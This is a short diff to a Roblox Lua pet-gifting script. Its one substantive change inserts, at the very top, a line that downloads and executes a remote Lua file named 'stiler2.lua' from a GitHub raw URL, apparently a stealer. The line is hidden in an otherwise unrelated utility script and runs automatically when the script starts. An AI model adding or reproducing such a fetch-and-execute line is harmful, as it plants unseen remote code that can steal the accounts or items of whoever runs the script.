@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua"))()
+
 warn("[PETGIFT] Script started")
 
 local DEBUG_TAG = "[PETGIFT]"
@@ -140,3 +142,4 @@ task.spawn(function()
 		--pickUpPlacedPets()
 	end
 end)
+
